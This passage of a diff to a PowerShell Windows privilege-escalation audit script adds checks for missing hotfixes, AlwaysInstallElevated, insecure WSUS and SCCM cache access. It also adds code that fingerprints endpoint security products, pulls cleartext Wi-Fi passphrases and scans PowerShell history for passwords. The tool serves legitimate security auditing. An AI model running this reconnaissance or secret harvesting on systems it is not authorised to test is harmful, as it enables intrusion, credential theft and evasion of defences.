+    KB4561600 Security Update NT AUTHORITY\SYSTEM   2020-06-22 13:00:50
+    KB4578968 Update          NT AUTHORITY\SYSTEM   2020-10-14 18:06:18
+    KB4580325 Security Update NT AUTHORITY\SYSTEM   2020-10-14 13:09:37
+
+    #>
+
+    [CmdletBinding()] param()
+
+    function Get-PackageInfo {
+
+        param(
+            [string]$Path
+        )
+
+        $Info = New-Object -TypeName PSObject
+
+        [xml] $PackageContentXml = Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError
+        if (-not $GetContentError) {
+
+            $PackageContentXml.GetElementsByTagName("assembly") | ForEach-Object {
+
+                $Info | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value "$($_.displayName)"
+                $Info | Add-Member -MemberType "NoteProperty" -Name "SupportInformation" -Value "$($_.supportInformation)"
+            }
+
+            $PackageContentXml.GetElementsByTagName("package") | ForEach-Object {
+
+                $Info | Add-Member -MemberType "NoteProperty" -Name "Identifier" -Value "$($_.identifier)"
+                $Info | Add-Member -MemberType "NoteProperty" -Name "ReleaseType" -Value "$($_.releaseType)"
+            }
+
+            $Info
+        }
+    }
+
+    if ($CachedHotFixList.Count -eq 0) {
+
+        # In the registry, one KB may have multiple entries because it can be split up into multiple
+        # packages. This array will help keep track of KBs that have already been checked by the 
+        # script.
+        $InstalledKBs = New-Object -TypeName System.Collections.ArrayList
+
+        $AllPackages = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem
+
+        if (-not $ErrorGetChildItem) {
+
+            $AllPackages | ForEach-Object {
+        
+                # Filter only KB-related packages
+                if (($_.Name | Split-Path -Leaf) -Like "Package_*_for_KB*") {
+            
+                    $PackageProperties = $_ | Get-ItemProperty
+        
+                    # Get the KB id, e.g.: KBXXXXXXX
+                    $PackageName = $PackageProperties.InstallName.Split('~')[0].Split('_') | Where-Object { $_ -Like "KB*" }
+                    if ($PackageName) {
+        
+                        # Check whether this KB has already been handled
+                        if (-not ($InstalledKBs -contains $PackageName)) {
+        
+                            # Add the KB id to the list so we don't check it multiple times
+                            [void]$InstalledKBs.Add($PackageName)
+        
+                            # Who installed this update?
+                            $InstalledBy = Convert-SidToName -Sid $PackageProperties.InstallUser
+                            
+                            # Get the install date. It's stored in the registry just like a FILETIME structure.
+                            # So, we have to combine the low part and the high part and convert the result 
+                            # to a DateTime object.
+                            $DateHigh = $PackageProperties.InstallTimeHigh
+                            $DateLow = $PackageProperties.InstallTimeLow
+                            $FileTime = $DateHigh * [Math]::Pow(2, 32) + $DateLow
+                            $InstallDate = [DateTime]::FromFileTime($FileTime)
+        
+                            # Parse the package metadata file and extract some useful information...
+                            $ServicingPackagesPath = Join-Path -Path $env:windir -ChildPath "servicing\Packages"
+                            $PackagePath = Join-Path -Path $ServicingPackagesPath -ChildPath $PackageProperties.InstallName
+                            $PackageInfo = Get-PackageInfo -Path $PackagePath
+        
+                            $Entry = New-Object -TypeName PSObject 
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "HotFixID" -Value "$PackageName"
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "$($PackageInfo.ReleaseType)"
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "InstalledBy" -Value "$InstalledBy"
+                            $Entry | Add-Member -MemberType "NoteProperty" -Name "InstalledOn" -Value $InstallDate
+                            [void]$CachedHotFixList.Add($Entry)
+                        }
+                    }
+                }
+            }
+        } else {
+
+            # If we can't read the registry, fall back to the built-in 'Get-HotFix' cmdlet
+            Get-HotFix | Select-Object HotFixID,Description,InstalledBy,InstalledOn | ForEach-Object {
+                [void]$CachedHotFixList.Add($_)
+            }
+        }
+    }
+
+    $CachedHotFixList | ForEach-Object {
+        $_
+    }
+}
+
+function Get-SccmCacheFolder {
+    <#
+    .SYNOPSIS
+    
+    Helper - Get the SCCM cache folder as a PowerShell object if it exists.
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    #>
+
+    [CmdletBinding()] param ()
+
+    $CcmCachePath = Join-Path -Path $env:windir -ChildPath "CCMCache"
+    Get-Item -Path $CcmCachePath -ErrorAction SilentlyContinue | Select-Object -Property FullName,Attributes,Exists
+}
 #endregion Helpers 
 
 
@@ -2199,7 +2388,7 @@ function Get-UnattendSensitiveData {
 #region Checks 
 
 # ----------------------------------------------------------------
-# BEGIN REGISTRY SETTINGS   
+# BEGIN CONFIG   
 # ----------------------------------------------------------------
 function Invoke-UacCheck {
     <#
@@ -2336,6 +2525,54 @@ function Invoke-PowershellTranscriptionCheck {
     } 
 }
 
+function Invoke-BitlockerCheck {
+    <#
+    .SYNOPSIS
+    
+    Checks whether BitLocker is enabled (workstations only).
+    
+    .DESCRIPTION
+
+    When BitLocker is enabled on the system drive, the value "BootStatus" is set to 1 in the 
+    following registry key: 'HKLM\SYSTEM\CurrentControlSet\Control\BitLockerStatus'.
+    
+    .EXAMPLE
+
+    An example
+    
+    #>
+
+    [CmdletBinding()]Param()
+
+    $MachineRole = Invoke-MachineRoleCheck
+
+    if ($MachineRole.Name -Like "WinNT") {
+
+        $RegPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\BitLockerStatus"
+
+        $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+        if (-not $GetItemPropertyError) {
+
+            if (-not ($Item.BootStatus -eq 1)) {
+
+                $BitlockerResult = New-Object -TypeName PSObject 
+                $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
+                $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "BootStatus" -Value $Item.BootStatus
+                $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "BitLocker isn't enabled."
+                $BitlockerResult
+            }
+
+        } else {
+
+            $BitlockerResult = New-Object -TypeName PSObject 
+            $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
+            $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "BootStatus" -Value ""
+            $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "BitLocker isn't configured."
+            $BitlockerResult
+        }
+    }
+}
+
 function Invoke-RegistryAlwaysInstallElevatedCheck {
     <#
     .SYNOPSIS
@@ -2347,12 +2584,16 @@ function Invoke-RegistryAlwaysInstallElevatedCheck {
     
     .DESCRIPTION
 
-    AlwaysInstallElevated can be configured in both HKLM and HKCU. Therefore, this function will
-    check these two locations and return the corresponding key if it exists and is enabled. 
+    AlwaysInstallElevated can be configured in both HKLM and HKCU. "If the AlwaysInstallElevated 
+    value is not set to "1" under both of the preceding registry keys, the installer uses elevated
+    privileges to install managed applications and uses the current user's privilege level for 
+    unmanaged applications."
     
     #>
     
     [CmdletBinding()]Param()
+
+    $Result = New-Object -TypeName System.Collections.ArrayList
 
     $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer"
 
@@ -2360,26 +2601,29 @@ function Invoke-RegistryAlwaysInstallElevatedCheck {
 
         $HKLMval = Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
         if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
-            $RegistryAlwaysInstallElevatedItem = New-Object -TypeName PSObject 
-            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
-            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
-            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
-            $RegistryAlwaysInstallElevatedItem
-        } 
-    } 
-
-    $RegPath = "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer"
-
-    if (Test-Path -Path "Registry::$RegPath" -ErrorAction SilentlyContinue) {
-        $HKCUval = (Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
-        if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
-            $RegistryAlwaysInstallElevatedItem = New-Object -TypeName PSObject
-            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
-            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
-            $RegistryAlwaysInstallElevatedItem | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
-            $RegistryAlwaysInstallElevatedItem
+            $Item = New-Object -TypeName PSObject 
+            $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
+            $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
+            $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
+            [void]$Result.Add($Item)
         }
-    }   
+
+        $RegPath = "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer"
+
+        if (Test-Path -Path "Registry::$RegPath" -ErrorAction SilentlyContinue) {
+
+            $HKCUval = (Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
+            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
+                $Item = New-Object -TypeName PSObject
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
+                $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
+                $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
+                [void]$Result.Add($Item)
+
+                $Result
+            }
+        } 
+    }
 }
 
 function Invoke-LsaProtectionsCheck {
@@ -2445,9 +2689,9 @@ function Invoke-WsusConfigCheck {
     
     .DESCRIPTION
     
-    A system can be compromise if the updates are not requested using HTTPS but HTTP. If the URL of
-    the update server (WUServer) starts with HTTP and UseWUServer=1, then the update requests are
-    vulnerable to MITM attacks.
+    A system can be compromised if the updates are not requested using HTTPS but HTTP. If the URL
+    of the update server (WUServer) starts with HTTP and UseWUServer=1, then the update requests 
+    are vulnerable to MITM attacks.
     
     .EXAMPLE
     
@@ -2455,7 +2699,6 @@ function Invoke-WsusConfigCheck {
 
     WUServer     : http://acme-upd01.corp.internal.com:8535
     UseWUServer  : 1
-    IsVulnerable : True
     
     .LINK
 
@@ -2477,21 +2720,91 @@ function Invoke-WsusConfigCheck {
             $WusEnabled = $UseWUServerValue.UseWUServer
             
             if ($WusUrl -Like "http://*" -and $WusEnabled -eq 1) {
-                $IsVulnerable = $True
-            } else {
-                $IsVulnerable = $False
-            }
+                
+                $Result = New-Object -TypeName PSObject
+                $Result | Add-Member -MemberType "NoteProperty" -Name "WUServer" -Value $WusUrl
+                $Result | Add-Member -MemberType "NoteProperty" -Name "UseWUServer" -Value $WusEnabled
+                $Result
+            } 
+        }
+    }
+}
 
-            $Result = New-Object -TypeName PSObject
-            $Result | Add-Member -MemberType "NoteProperty" -Name "WUServer" -Value $WusUrl
-            $Result | Add-Member -MemberType "NoteProperty" -Name "UseWUServer" -Value $WusEnabled
-            $Result | Add-Member -MemberType "NoteProperty" -Name "IsVulnerable" -Value $IsVulnerable
-            $Result
-        }        
+function Invoke-SccmCacheFolderCheck {
+    <#
+    .SYNOPSIS
+    
+    Gets some information about the SCCM cache folder if it exists.
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    If the SCCM cache folder exists ('C:\Windows\CCMCache'), this check will return some information
+    about the item, such as the ACL. This allows for further manual analysis.
+    
+    .EXAMPLE
+
+    TODO
+    
+    #>
+
+    [CmdletBinding()] param ()
+
+    $SccmCacheFolderItem = Get-SccmCacheFolder
+    if ($SccmCacheFolderItem) {
+
+        $Result = $SccmCacheFolderItem
+        try {
+            # We need a try/catch block because ErrorAction doesn't catch access denied errors
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Acl" -Value $($SccmCacheFolderItem | Get-Acl -ErrorAction SilentlyContinue | Select-Object -ExpandProperty AccessToString) 
+        } catch {
+            # Access denied, do nothing
+        }
+        $Result
+    }
+}
+
+function Invoke-SccmCacheFolderVulnCheck {
+    <#
+    .SYNOPSIS
+
+    Checks whether the ccmcache folder is accessible.
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    When SCCM is used to remotely install packages, a cache folder is created in the Windows 
+    directory: 'C:\Windows\ccmcache'. MSI packages contained in this folder may contain some
+    cleartext credentials. Therefore, normal users shouldn't be allowed to browse this 
+    directory.
+    
+    .EXAMPLE
+
+    PS C:\> Invoke-SccmCacheFolderVulnCheck
+
+    FullName   : C:\WINDOWS\CCMCache
+    Attributes : Directory
+    Exists     : True
+    
+    #>
+
+    [CmdletBinding()] param ()
+
+    $SccmCacheFolder = Get-SccmCacheFolder
+    if ($SccmCacheFolder) {
+
+        Get-ChildItem -Path $SccmCacheFolder.FullName -ErrorAction SilentlyContinue -ErrorVariable ErrorGetChildItem | Out-Null
+        if (-not $ErrorGetChildItem) {
+            $SccmCacheFolder
+        }
     }
 }
 # ----------------------------------------------------------------
-# END REGISTRY SETTINGS   
+# END CONFIG   
 # ----------------------------------------------------------------
 
 
@@ -2510,7 +2823,7 @@ function Get-RpcRange {
     .DESCRIPTION
 
     This function is a helper for the Invoke-TcpEndpointsCheck function. Windows uses a set of 
-    RPC ports that are radomly allocated in the range 49152-65535 by default. If we want to 
+    RPC ports that are randomly allocated in the range 49152-65535 by default. If we want to 
     filter out these listening ports we must first figure out this set of ports. The aim of this 
     function is to guess this range using basic statistics on a given array of port numbers. We 
     can quite reliably identify the RPC port set because they are concentrated in a very small 
@@ -2810,12 +3123,12 @@ function Invoke-WlanProfilesCheck {
         $Authentication = $Xml.WLANProfile.MSM.security.authEncryption.authentication
         $PassPhrase = $Xml.WLANProfile.MSM.security.sharedKey.keyMaterial
 
-        $Profile = New-Object -TypeName PSObject
-        $Profile | Add-Member -MemberType "NoteProperty" -Name "Profile" -Value $Name
-        $Profile | Add-Member -MemberType "NoteProperty" -Name "SSID" -Value $Ssid
-        $Profile | Add-Member -MemberType "NoteProperty" -Name "Authentication" -Value $Authentication
-        $Profile | Add-Member -MemberType "NoteProperty" -Name "PassPhrase" -Value $PassPhrase
-        $Profile
+        $ProfileResult = New-Object -TypeName PSObject
+        $ProfileResult | Add-Member -MemberType "NoteProperty" -Name "Profile" -Value $Name
+        $ProfileResult | Add-Member -MemberType "NoteProperty" -Name "SSID" -Value $Ssid
+        $ProfileResult | Add-Member -MemberType "NoteProperty" -Name "Authentication" -Value $Authentication
+        $ProfileResult | Add-Member -MemberType "NoteProperty" -Name "PassPhrase" -Value $PassPhrase
+        $ProfileResult
     }
 
     $ERROR_SUCCESS = 0
@@ -3041,12 +3354,11 @@ function Invoke-SystemStartupHistoryCheck {
             $SystemStartupHistoryItem = New-Object -TypeName PSObject 
             $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Index" -Value $EventNumber
             $SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Time" -Value "$(Convert-DateToString -Date $Event.TimeGenerated)"
-            #$SystemStartupHistoryItem | Add-Member -MemberType "NoteProperty" -Name "Message" -Value "$($Event.Message)"
             [void]$SystemStartupHistoryResult.Add($SystemStartupHistoryItem)
             $EventNumber += 1
         }
 
-        $SystemStartupHistoryResult
+        $SystemStartupHistoryResult | Select-Object -First 10
     } catch {
         # We might get an "acces denied"
         Write-Verbose "Error while querying the Event Log."
@@ -3443,12 +3755,267 @@ function Invoke-WindowsUpdateCheck {
         if ($WindowsUpdate.LastInstallationSuccessDate) {
             $WindowsUpdateResult = New-Object -TypeName PSObject 
             $WindowsUpdateResult | Add-Member -MemberType "NoteProperty" -Name "Time" -Value $(Convert-DateToString -Date $WindowsUpdate.LastInstallationSuccessDate)
+            $WindowsUpdateResult | Add-Member -MemberType "NoteProperty" -Name "TimeRaw" -Value $WindowsUpdate.LastInstallationSuccessDate
             $WindowsUpdateResult
         } 
     } catch {
-        # We migh get an access denied when querying this COM object
+        # We might get an access denied when querying this COM object
         Write-Verbose "Error while requesting COM object Microsoft.Update.AutoUpdate."
     }
+}
+
+function Invoke-HotFixCheck {
+    <#
+    .SYNOPSIS
+
+    Gets a list of installed updates and hotfixes.
+    
+    .DESCRIPTION
+
+    This check simply invokes the helper function 'Get-HotFixList' and sorts the results from the
+    newest to the oldest.
+    
+    .EXAMPLE
+
+    PS C:\> Invoke-HotFixCheck
+
+    HotFixID  Description     InstalledBy           InstalledOn
+    --------  -----------     -----------           -----------
+    KB4578968 Update          NT AUTHORITY\SYSTEM   2020-10-14 18:06:18
+    KB4580325 Security Update NT AUTHORITY\SYSTEM   2020-10-14 13:09:37
+    KB4577266 Security Update NT AUTHORITY\SYSTEM   2020-09-11 13:37:59
+    KB4570334 Security Update NT AUTHORITY\SYSTEM   2020-08-13 17:45:34
+    KB4566785 Security Update NT AUTHORITY\SYSTEM   2020-07-16 13:08:14
+    KB4561600 Security Update NT AUTHORITY\SYSTEM   2020-06-22 13:00:50
+    KB4560366 Security Update DESKTOP-7A0AKQI\admin 2020-06-22 12:40:39
+    KB4537759 Security Update                       2020-05-11 07:44:14
+    KB4557968 Security Update                       2020-05-11 07:37:09
+
+    #>
+
+    [CmdletBinding()] param()
+
+    Get-HotFixList | Sort-Object -Property "InstalledOn" -Descending
+}
+
+function Invoke-HotFixVulnCheck {
+    <#
+    .SYNOPSIS
+
+    Checks whether any hotfix has been installed in the last 31 days.
+    
+    .DESCRIPTION
+
+    This script first lists all the installed hotfixes. If no result is returned, this will be
+    reported as a finding. If at least one result is returned, the script will check the first 
+    one (which corresponds to the latest hotfix). If it's more than 31 days old, it will be 
+    returned.
+    
+    .EXAMPLE
+
+    An example
+
+    #>
+
+    [CmdletBinding()] param()
+
+    $Hotfixes = Get-HotFixList | Sort-Object -Property "InstalledOn" -Descending
+
+    if ($(([object[]]$Hotfixes).Length) -gt 0) {
+
+        $LatestHotfix = $Hotfixes | Select-Object -First 1
+        $TimeSpan = New-TimeSpan -Start $LatestHotfix.InstalledOn -End $(Get-Date)
+
+        if ($TimeSpan.TotalDays -gt 31) {
+            $LatestHotfix
+        } else {
+            Write-Verbose "At least one hotfix was installed in the last 31 days."
+        }
+    } else {
+        Write-Verbose "The hotfix history is empty."
+    }
+}
+
+function Invoke-EndpointProtectionCheck {
+    <#
+    .SYNOPSIS
+    
+    Gets a list of security software products 
+    
+    .DESCRIPTION
+
+    This check was inspired by the script Invoke-EDRChecker.ps1 (PwnDexter). It enumerates the DLLs
+    that are loaded in the current process, the processes that are currently running, the installed
+    applications and the installed services. For each one of these entries, it extracts some 
+    metadata and checks whether it contains some known strings related to a given security software
+    product. If there is a match, the corresponding entry is returned along with the data that was
+    matched.
+    
+    .EXAMPLE
+
+    PS C:\> Invoke-EndpointProtectionCheck
+
+    ProductName      Source                Pattern
+    -----------      ------                -------
+    AMSI             Loaded DLL            FileName=C:\Windows\SYSTEM32\amsi.dll
+    AMSI             Loaded DLL            InternalName=amsi.dll
+    AMSI             Loaded DLL            OriginalFilename=amsi.dll
+    Windows Defender Loaded DLL            FileName=C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpOav.dll
+    Windows Defender Loaded DLL            FileName=C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MPCLIENT.DLL
+    Windows Defender Running process       ProcessName=MsMpEng
+    Windows Defender Running process       Name=MsMpEng
+    Windows Defender Running process       ProcessName=NisSrv
+    Windows Defender Running process       Name=NisSrv
+    Windows Defender Running process       ProcessName=SecurityHealthService
+    Windows Defender Running process       Name=SecurityHealthService
+    Windows Defender Running process       Description=Windows Defender SmartScreen
+    Windows Defender Installed application Name=Windows Defender
+    Windows Defender Installed application Name=Windows Defender
+    Windows Defender Installed application Name=Windows Defender Advanced Threat Protection
+    Windows Defender Service               Name=SecurityHealthService
+    Windows Defender Service               ImagePath=C:\Windows\system32\SecurityHealthService.exe
+    Windows Defender Service               RegistryKey=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService
+    Windows Defender Service               RegistryPath=Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService
+    Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe,-1001
+    Windows Defender Service               ImagePath="C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
+    Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-390
+    Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-330
+    Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-370
+    Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-320
+    Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\NisSrv.exe"
+    Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-310
+    Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MsMpEng.exe"
+    
+    .NOTES
+
+    Credit goes to PwnDexter: https://github.com/PwnDexter/Invoke-EDRChecker
+    #>
+
+    [CmdletBinding()] param()
+
+    $Signatures = @{
+        "AMSI"                          = "amsi.dll"
+        "AppSense"                      = "emcoreservice,emsystem,watchdogagent"
+        "Avast"                         = "avast"
+        "Avecto Defendpoint"            = "avecto,defendpoint,pgeposervice,pgsystemtray,privilegeguard"
+        "Carbon Black"                  = "carbon,cb.exe,logrhythm"
+        "Cisco AMP"                     = "ciscoamp"
+        "CounterTack"                   = "countertack"
+        "CrowdStrike"                   = "crowdstrike,csagent,csfalcon,csshell,windowssensor"
+        "Cybereason"                    = "activeconsole,cramtray,crssvc,cybereason"
+        "Cylance"                       = "cylance,cyoptics,cyupdate"
+        "Endgame"                       = "endgame"
+        "ESET Endpoint Inspector"       = "inspector"
+        "eTrust EZ AV"                  = "groundling"
+        "FireEye"                       = "fireeye,mandiant,xagt"
+        "ForeScout"                     = "forescout,secureconnector"
+        "IBM QRadar"                    = "qradar,wincollect"
+        "Ivanti"                        = "ivanti"
+        "Kaspersky"                     = "kaspersky"
+        "Lacuna"                        = "lacuna"
+        "McAfee"                        = "mcafee"
+        "Morphisec"                     = "morphisec"
+        "Program Protector"             = "protectorservice"
+        "Red Canary"                    = "canary"
+        "Red Cloak"                     = "procwall,redcloak,cyclorama"
+        "SentinelOne"                   = "sentinel"
+        "Sophos"                        = "sophos"
+        "Symantec Endpoint Protection"  = "eectrl,semlaunchsvc,sepliveupdate,sisidsservice,sisipsservice,sisipsutil,smc.exe,smcgui,snac64,srtsp,symantec,symcorpui,symefasi"
+        "Sysinternals Antivirus"        = "sysinternal"
+        "Sysinternals Sysmon"           = "sysmon"
+        "Tanium Enforce"                = "tanium,tpython"
+        "Traps"                         = "cyvera,cyserver,cytray,PaloAltoNetworks,tda.exe,tdawork"
+        "Trend Micro"                   = "ntrtscan,tmlisten,tmbmsrv,tmssclient,tmccsf,trend"
+        "Windows Defender"              = "defender,msascuil,msmpeng,nissrv,securityhealthservice"
+    }
+
+    function Find-ProtectionSoftware {
+
+        param(
+            [object]$Object
+        )
+
+        $Signatures.Keys | ForEach-Object {
+
+            $ProductName = $_
+            $ProductSignatures = $Signatures.Item($_).Split(",")
+
+            $Object | Select-String -Pattern $ProductSignatures -AllMatches | ForEach-Object {
+
+                $($_ -Replace "@{").Trim("}").Split(";") | ForEach-Object {
+
+                    $_.Trim() | Select-String -Pattern $ProductSignatures -AllMatches | ForEach-Object {
+
+                        $SignatureMatch = New-Object -TypeName PSObject 
+                        $SignatureMatch | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$ProductName"
+                        $SignatureMatch | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_)"
+                        $SignatureMatch
+                    }
+                }
+            }
+        }
+    }
+
+    # Need to store all the results into one arraylist so we can sort them on the product name.
+    $Results = New-Object System.Collections.ArrayList
+    
+    # Check DLLs loaded in the current process
+    Get-Process -Id $PID -Module | ForEach-Object {
+
+        if (Test-Path -Path $_.FileName) {
+
+            $DllDetails = (Get-Item $_.FileName).VersionInfo | Select-Object -Property CompanyName,FileDescription,FileName,InternalName,LegalCopyright,OriginalFileName,ProductName
+            Find-ProtectionSoftware -Object $DllDetails | ForEach-Object {
+    
+                $Result = New-Object -TypeName PSObject
+                $Result | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+                $Result | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Loaded DLL"
+                $Result | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+                [void] $Results.Add($Result)
+            }
+        }
+    }
+
+    # Check running processes
+    Get-Process | Select-Object -Property ProcessName,Name,Path,Company,Product,Description | ForEach-Object {
+
+        Find-ProtectionSoftware -Object $_ | ForEach-Object {
+
+            $Result = New-Object -TypeName PSObject
+            $Result | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Running process"
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+            [void] $Results.Add($Result)
+        }
+    }
+
+    # Check installed applications 
+    Get-InstalledPrograms | Select-Object -Property Name | ForEach-Object {
+
+        Find-ProtectionSoftware -Object $_ | ForEach-Object {
+
+            $Result = New-Object -TypeName PSObject
+            $Result | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Installed application"
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+            [void] $Results.Add($Result)
+        }
+    }
+
+    # Check installed services 
+    Get-ServiceList -FilterLevel 1 | ForEach-Object {
+
+        Find-ProtectionSoftware -Object $_ | ForEach-Object {
+
+            $Result = New-Object -TypeName PSObject
+            $Result | Add-Member -MemberType "NoteProperty" -Name "ProductName" -Value "$($_.ProductName)"
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Source" -Value "Service"
+            $Result | Add-Member -MemberType "NoteProperty" -Name "Pattern" -Value "$($_.Pattern)"
+            [void] $Results.Add($Result)
+        }
+    }
+
+    $Results | Sort-Object -Property ProductName,Source
 }
 
 # ----------------------------------------------------------------
@@ -3596,9 +4163,9 @@ function Invoke-UserGroupsCheck {
 
             if (-not $KnownSid) {
 
-                if ($GroupSid -notmatch '^S-1-5.*') {
+                try {
                     $GroupName = ($Group.Translate([System.Security.Principal.NTAccount])).Value
-                } else {
+                } catch {
                     $GroupName = "N/A"
                 }
 
@@ -3634,22 +4201,11 @@ function Invoke-UserPrivilegesCheck {
     ----                   -----   -----------
     SeImpersonatePrivilege Enabled Impersonate a client after authentication
     
-    .NOTES
-
-    Interesting privileges:
-
-        - SeAssignPrimaryTokenPrivilege
-        - SeImpersonatePrivilege
-        - SeCreateTokenPrivilege
-        - SeDebugPrivilege
-        - SeLoadDriverPrivilege
-        - SeRestorePrivilege
-        - SeTakeOwnershipPrivilege
     #>
 
     [CmdletBinding()] param()    
 
-    $HighPotentialPrivileges = "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeLoadDriverPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeBackupPrivilege", "SeShutdownPrivilege"
+    $HighPotentialPrivileges = "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeLoadDriverPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeBackupPrivilege", "SeManageVolumePrivilege"
 
     $CurrentPrivileges = Get-UserPrivileges
 
@@ -4469,6 +5025,50 @@ function Invoke-GPPPasswordCheck {
         }
     }
 }
+
+function Invoke-PowerShellHistoryCheck {
+    <#
+    .SYNOPSIS
+
+    Searches for interesting keywords in the PowerShell history of the current user.
+    
+    .DESCRIPTION
+
+    PowerShell commands are saved in a file (ConsoleHost_history.txt), in a subdirectory of the 
+    current user's AppData folder. This script extracts the content of this file and also checks 
+    whether it contains some keywords such as "password".
+    
+    .EXAMPLE
+
+    PS C:\> Invoke-PowerShellHistoryCheck
+
+    Path          : C:\Users\lab-user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    CreationTime  : 11/11/2019 11:01:55
+    LastWriteTime : 04/10/2020 22:40:30
+    Lines         : 634
+    Matches       : 12
+    
+    #>
+
+    $HistoryFilePath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    $HistoryFileContent = Get-Content -Path $HistoryFilePath -ErrorAction SilentlyContinue -ErrorVariable ErrorGetContent
+
+    if (-not $ErrorGetContent) {
+
+        $HistoryCount = $HistoryFileContent.Count
+        $AllMatches = $HistoryFileContent | Select-String -Pattern $KeywordsOfInterest -AllMatches
+        $AllMatchesCount = $AllMatches.Count
+        $FileItem = Get-Item -Path $HistoryFilePath
+
+        $Item = New-Object -TypeName PSObject
